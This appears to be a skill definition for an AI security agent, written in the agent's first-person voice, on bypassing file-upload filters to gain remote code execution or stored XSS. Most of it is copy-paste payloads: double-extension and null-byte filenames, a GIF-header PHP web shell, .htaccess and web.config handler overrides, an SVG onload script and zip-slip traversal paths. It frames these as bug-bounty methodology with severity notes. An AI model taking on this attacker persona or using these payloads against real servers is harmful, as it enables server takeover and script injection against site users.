# SKILL: File Upload Bypass → RCE / Stored XSS / SSRF / DoS

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (file upload bypass → rce / stored xss / ssrf / dos) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
I bypass MIME / extension / magic-byte / content-scan filters with polyglots, double-extensions, null bytes, archive parsing, and metadata injection.

---

## DETECTION
Map upload endpoint. Note allowed extensions, MIME, max size. Check whether the upload path is web-rooted and executable.

## EXPLOITATION
### Bypass extension filter
```
shell.php
shell.PHP
shell.pHp
shell.php.jpg
shell.jpg.php
shell.php5
shell.phtml
shell.phar
shell.pht
shell.inc
shell.php\x00.jpg
shell.php%00.jpg
shell.php;.jpg
shell.php:.jpg     (NTFS alt data stream)
shell.php/         (some servers strip trailing slash)
shell.php.        (Windows trailing dot)
.htaccess          (override mime exec for current dir)
```

### Bypass MIME — set Content-Type
```
Content-Type: image/png    + body PHP code
```

### Bypass magic byte
```
GIF89a;<?php system($_GET['c']); ?>
```

### Polyglot files
- GIF + PHP polyglot
- JPEG with PHP in EXIF comment
- PDF + JS payload (XSS in PDF viewers)
- SVG + XSS / XXE
- ZIP + symlink (Zip slip)
- Phar + polyglot for unserialize trigger

### .htaccess override (Apache)
```
AddType application/x-httpd-php .pwn
```
Then upload `shell.pwn`.

### web.config override (IIS)
```xml
<configuration>
 <system.webServer>
  <handlers>
   <add name="x" path="*.config" verb="*" type="System.Web.UI.PageHandlerFactory" />
  </handlers>
 </system.webServer>
</configuration>
```

### SVG XSS
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

### Zip slip
Archive contains `../../../../var/www/html/shell.php` — extracts traversal-up.

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
(see above — extension/MIME/magic/encoding tiers)

## CHAIN POTENTIAL
RCE / Stored XSS / file overwrite / DoS via zip bomb.

## TOOLS
Burp Upload Scanner, mlcsec/upload-bypass, manual Hackvertor

## COMMANDS
Burp Repeater + Upload Scanner ext

## EDGE CASES / NOT-A-BUG TRAPS
Static-only buckets (S3) won't execute PHP; but XSS via SVG/HTML still works.

## TRIAGE ANGLE (per platform)
Show RCE via uploaded shell + execution.

## SEVERITY & CVSS
9.8 if RCE.

## REFERENCES
PortSwigger File Upload • PayloadsAllTheThings/Upload Insecure Files
